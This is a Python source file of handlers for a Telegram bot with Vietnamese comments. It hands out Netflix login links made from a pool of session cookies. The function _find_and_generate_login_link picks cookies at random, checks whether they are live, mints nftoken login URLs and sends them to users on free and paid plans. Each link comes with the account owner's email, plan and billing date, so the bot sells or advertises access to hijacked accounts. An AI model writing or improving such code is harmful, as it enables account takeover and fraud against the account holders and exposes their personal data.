"""
Handlers for the minimal Netflix bot.

Only /start and /loginlink. Quota + plan live on Supabase (web-managed).
"""

import asyncio
import datetime
import logging
import random
import time
from concurrent.futures import ThreadPoolExecutor
from html import escape
from urllib.parse import quote

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ContextTypes
from telegram.constants import ParseMode

from config import (
    ADMIN_IDS,
    ADMIN_TAG,
    WEB_URL,
    SHRINKME_API_KEY,
)
from lang import t
from supabase_client import (
    bind_telegram_to_profile,
    consume_quota,
    downgrade_expired,
    expire_telegram_link,
    get_cookie_pool,
    get_or_create_profile,
    get_profile_by_telegram,
    get_quota_left,
    get_telegram_link,
    get_user_lang,
    mark_telegram_link_linked,
    set_user_lang,
    update_cookie_status,
)
from shrinkme import shorten

logger = logging.getLogger("NetflixBot")

_executor = ThreadPoolExecutor(max_workers=4)

# ── Rate limit: 5 lần/15 phút/user ──
_rate = {}  # user_id -> [timestamps]

# ── Pending telegram link confirmations ──
# telegram_id -> {"token": str, "web_user_id": str, "web_email": str, "created": float}
_link_pending = {}
_LINK_PENDING_TTL = 10 * 60  # 10 phút, khớp TTL token


def _link_pending_expired(pending):
    return (time.time() - pending.get("created", 0)) > _LINK_PENDING_TTL


def _rate_limited(key, user_id, limit=5, window=15 * 60):
    now = time.time()
    ts = [t for t in _rate.get((key, user_id), []) if now - t < window]
    if len(ts) >= limit:
        _rate[(key, user_id)] = ts
        return True
    ts.append(now)
    _rate[(key, user_id)] = ts
    return False


def _build_device_links(link):
    """Build 3-device login links from a login URL."""
    if not link:
        return {}
    token = ""
    if "nftoken=" in link:
        token = link.split("nftoken=", 1)[1]
    if not token:
        return {"pc": link, "phone": link, "tv": link}
    return {
        "pc": f"https://netflix.com/?nftoken={token}",
        "phone": f"https://netflix.com/unsupported?nftoken={token}",
        "tv": f"https://netflix.com/tv2?nftoken={token}",
    }


def _find_and_generate_login_link():
    """
    Chọn cookie ngẫu nhiên từ pool (Supabase) → check → gen NFToken → validate.
    Returns (link, error, payload).
    """
    from checker import parse_cookie_line, check_cookie, generate_nftoken, validate_nftoken

    pool = get_cookie_pool()
    if not pool:
        return None, "Không có cookie trong pool. Vui lòng thử lại sau.", None

    max_tries = min(len(pool), 10)
    used = set()
    for _ in range(max_tries):
        idx = random.randrange(len(pool))
        if idx in used:
            continue
        used.add(idx)
        raw = pool[idx]

        netflix_id, secure_id, extras = parse_cookie_line(raw)
        if not netflix_id:
            continue

        info = check_cookie(netflix_id, secure_id)
        status = info.get("status")

        if status == "DEAD":
            update_cookie_status(raw, "dead", dead_reason=info.get("status"))
            continue
        if status == "ERROR":
            time.sleep(1)
            continue
        if str(info.get("membershipStatus", "")).upper() == "FORMER_MEMBER":
            update_cookie_status(raw, "dead", dead_reason="FORMER_MEMBER")
            continue

        # Cookie LIVE — build cookie dict + gen nftoken
        cookie_dict = {"NetflixId": netflix_id}
        if secure_id:
            cookie_dict["SecureNetflixId"] = secure_id
        cookie_dict.update(extras)
        cookie_dict.update(info.get("_cookies") or {})

        token, error = generate_nftoken(cookie_dict)
        if not token:
            continue

        login_link = f"https://www.netflix.com/login?nftoken={quote(token, safe='')}"
        payload = {
            "plan": info.get("plan") or "-",
            "email": info.get("email") or "-",
            "billing": info.get("billing") or "-",
        }

        # Validate token (không chặn nếu unknown)
        v = validate_nftoken(token)
        if v is False:
            continue

        # Cập nhật trạng thái cookie lên Supabase
        update_cookie_status(
            raw,
            "green",
            country_code=info.get("country"),
            plan_name=info.get("plan"),
            email=info.get("email"),
        )
        return login_link, None, payload

    return None, "Không tìm thấy cookie LIVE. Vui lòng thử lại sau.", None


def _build_loginlink_message(link, payload, quota_left, quota_limit, lang="vi"):
    """Tin nhắn kết quả nhận link — format chuẩn (Plan/Mail/Hạn + 3 link thiết bị)."""
    account_plan = (payload or {}).get("plan") or "-"
    email = (payload or {}).get("email") or "-"
    billing = (payload or {}).get("billing") or "-"

    links = _build_device_links(link)
    admin_url = "https://t.me/" + ADMIN_TAG.lstrip("@")
    lines = [
        t("link_header", lang),
        "",
        t("link_plan", lang, plan=escape(str(account_plan))),
        t("link_mail", lang, email=escape(str(email))),
        t("link_han", lang, billing=escape(str(billing))),
        "",
        t("link_title", lang),
    ]
    if links:
        lines.append(
            t("link_devices", lang, pc=links["pc"], phone=links["phone"], tv=links["tv"])
        )
    else:
        lines.append(f"<code>{escape(link)}</code>")
    lines.append("")
    lines.append(t("link_expire", lang))

    if quota_limit > 0:
        lines.append(t("link_remaining", lang, left=quota_left, limit=quota_limit))
    else:
        lines.append(t("link_remaining_inf", lang))

    lines.append(t("link_admin", lang, admin=f'<a href="{admin_url}">Admin</a>'))
    return "\n".join(lines)


def _build_free_gate_message(shortened_link, lang="vi"):
    """Tin nhắn gate cho user Free: link rút gọn dạng copyable + nút inline tới shrinkme."""
    admin_url = "https://t.me/" + ADMIN_TAG.lstrip("@")
    lines = [
        t("link_shrinkme_gate", lang),
        "",
        t("link_shrinkme_ad", lang),
        "",
        f"🔗 <code>{escape(shortened_link)}</code>",
        "",
        t("link_shrinkme_note", lang),
        "",
        t("link_admin", lang, admin=f'<a href="{admin_url}">Admin</a>'),
    ]
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton(t("link_shrinkme_btn", lang), url=shortened_link)],
    ])
    return "\n".join(lines), keyboard


async def _deliver_login_link(update: Update, context: ContextTypes.DEFAULT_TYPE, profile, lang="vi"):
    """Tạo + gửi link đăng nhập. Trừ quota nếu basic/pro."""
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg:
        return False

    searching = await msg.reply_text(t("searching", lang), parse_mode=ParseMode.HTML)

    loop = asyncio.get_event_loop()
    link, error, payload = await loop.run_in_executor(_executor, _find_and_generate_login_link)

    if not link:
        await searching.edit_text(
            f"❌ {error or 'Không thể tạo link. Vui lòng thử lại sau.'}",
            parse_mode=ParseMode.HTML,
        )
        return False

    # Áp dụng shrinkme gate cho free users — FAIL-CLOSED: API lỗi → báo lỗi hệ thống
    # link vượt, KHÔNG fallback link gốc (yêu cầu nghiệp vụ).
    plan = profile.get("plan") or "free"
    if plan == "free":
        # shorten() là I/O blocking → chạy trong executor để không chặn event loop
        loop = asyncio.get_event_loop()
        shortened = await loop.run_in_executor(_executor, shorten, link)
        if not shortened:
            await searching.edit_text(
                t("gate_error", lang),
                parse_mode=ParseMode.HTML,
            )
            return False
        gate_text, gate_keyboard = _build_free_gate_message(shortened, lang)
        await searching.edit_text(
            gate_text,
            parse_mode=ParseMode.HTML,
            reply_markup=gate_keyboard,
            disable_web_page_preview=True,
        )
        return True

    # Trừ quota (chỉ basic/pro)
    quota_left = get_quota_left(profile)
    quota_limit = int(profile.get("quota_limit") or 0)
    if profile.get("plan") not in (None, "free"):
        updated = consume_quota(profile)
        if updated:
            quota_left = get_quota_left(updated)

    await searching.edit_text(
        _build_loginlink_message(link, payload, quota_left, quota_limit, lang),
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
    )
    return True


async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg:
        return

    # ── Liên kết web -> bot (user bấm deep link từ web: t.me/bot?start=link_XXXX) ──
    text = (msg.text or "").strip()
    if text.startswith("/start link_"):
        token = text.split("link_", 1)[1]
        lang = get_user_lang(user.id)
        link = get_telegram_link(token)
        if not link:
            await msg.reply_text(t("link_invalid", lang), parse_mode=ParseMode.HTML)
            return
        if link.get("status") == "linked":
            await msg.reply_text(t("link_already", lang), parse_mode=ParseMode.HTML)
            return
        expires_at = link.get("expires_at")
        if link.get("status") == "expired" or (
            expires_at and _iso_older_than_now(expires_at)
        ):
            expire_telegram_link(token)
            await msg.reply_text(t("link_expired", lang), parse_mode=ParseMode.HTML)
            return

        web_user_id = link.get("web_user_id")
        web_email = link.get("web_email") or "-"
        if not web_user_id:
            await msg.reply_text(t("link_invalid", lang), parse_mode=ParseMode.HTML)
            return

        # Lưu pending + hiện nút xác nhận đúng email (chống người khác chiếm tài khoản)
        _link_pending[user.id] = {
            "token": token,
            "web_user_id": web_user_id,
            "web_email": web_email,
            "created": time.time(),
        }
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ Đúng, liên kết", callback_data="link_yes"),
             InlineKeyboardButton("❌ Hủy", callback_data="link_no")],
        ])
        await msg.reply_text(
            t("link_confirm_body", lang, email=escape(web_email)),
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
        )
        return

    # Profile: tìm theo telegram_id, chưa có → tự tạo Free (bot dùng ngay, không bắt buộc web)
    profile = get_or_create_profile(
        user.id, username=user.username, full_name=user.first_name
    )
    if not profile:
        await msg.reply_text(
            t("link_failed", get_user_lang(user.id)),
            parse_mode=ParseMode.HTML,
        )
        return

    # Chọn ngôn ngữ trước (lần đầu /start hoặc chưa có lang)
    lang = get_user_lang(user.id)
    if not profile.get("lang"):
        await msg.reply_text(
            t("lang_prompt", lang),
            reply_markup=_lang_keyboard(),
        )
        return

    await _send_welcome(update, profile, lang)


def _lang_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🇻🇳 Tiếng Việt", callback_data="lang_vi"),
         InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")],
    ])


async def _send_welcome(update: Update, profile, lang="vi", msg=None):
    user = update.effective_user
    if not user:
        return
    if msg is None:
        msg = update.effective_message
    if not msg:
        return
    name = user.first_name or user.username or "User"
    plan = profile.get("plan") or "free"
    plan_label = {"free": "Free", "basic": "Basic", "pro": "Pro"}.get(plan, plan)
    await msg.reply_text(
        t("welcome", lang, name=name, plan=plan_label),
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
    )


def _iso_older_than_now(iso_str):
    """Check chuỗi ISO time đã qua chưa (cho expires_at)."""
    try:
        dt = datetime.datetime.fromisoformat(str(iso_str).replace("Z", "+00:00"))
        return dt < datetime.datetime.now(datetime.timezone.utc)
    except Exception:
        return True


async def on_link_confirm_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Xử lý callback nút xác nhận/hủy liên kết Telegram (link_yes / link_no)."""
    query = update.callback_query
    if not query or not query.data:
        return
    user = update.effective_user
    if not user:
        return
    await query.answer()
    data = query.data  # "link_yes" hoặc "link_no"
    pending = _link_pending.pop(user.id, None)
    if not pending or _link_pending_expired(pending):
        try:
            await query.message.edit_text(t("link_session_expired", get_user_lang(user.id)))
        except Exception:
            pass
        return
    token = pending["token"]
    web_user_id = pending["web_user_id"]
    web_email = pending["web_email"]
    lang = get_user_lang(user.id)

    if data == "link_yes":
        # Xác nhận: bind telegram_id vào profile web + mark token linked
        ok = bind_telegram_to_profile(web_user_id, user.id)
        if ok:
            mark_telegram_link_linked(token, user.id)
            try:
                await query.message.edit_text(
                    t("link_success", lang, email=escape(web_email)),
                    parse_mode=ParseMode.HTML,
                )
            except Exception:
                pass
        else:
            try:
                await query.message.edit_text(t("link_failed", lang), parse_mode=ParseMode.HTML)
            except Exception:
                pass
    elif data == "link_no":
        # Hủy: expire token để web poll thấy expired
        expire_telegram_link(token)
        try:
            await query.message.edit_text(t("link_cancelled", lang))
        except Exception:
            pass


async def cmd_lang(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg:
        return
    lang = get_user_lang(user.id)
    await msg.reply_text(
        t("lang_prompt", lang),
        reply_markup=_lang_keyboard(),
    )


async def on_lang_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not query or not query.data:
        return
    user = query.from_user
    if not user:
        return
    lang = "vi" if query.data == "lang_vi" else "en"
    set_user_lang(user.id, lang)
    await query.answer()
    try:
        await query.message.edit_text(
            t("lang_saved", lang),
            parse_mode=ParseMode.HTML,
        )
    except Exception:
        pass
    profile = get_profile_by_telegram(user.id)
    if profile:
        await _send_welcome(update, profile, lang, msg=query.message)


async def cmd_loginlink(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg:
        return

    lang = get_user_lang(user.id)

    # Rate limit: 5 lần/15 phút
    if _rate_limited("loginlink", user.id):
        await msg.reply_text(
            t("rate_limited", lang),
            parse_mode=ParseMode.HTML,
        )
        return

    # Profile: tìm hoặc tự tạo Free (bot dùng ngay, không bắt buộc liên kết web)
    profile = get_or_create_profile(
        user.id, username=user.username, full_name=user.first_name
    )
    if not profile:
        await msg.reply_text(
            t("link_failed", lang),
            parse_mode=ParseMode.HTML,
        )
        return

    # Downgrade nếu plan hết hạn
    profile = downgrade_expired(profile)

    # Kiểm tra quota
    quota_left = get_quota_left(profile)
    quota_limit = int(profile.get("quota_limit") or 0)
    plan = profile.get("plan") or "free"

    if plan not in (None, "free") and quota_left <= 0:
        await msg.reply_text(
            t("no_uses_left", lang),
            parse_mode=ParseMode.HTML,
        )
        return

    await _deliver_login_link(update, context, profile, lang)
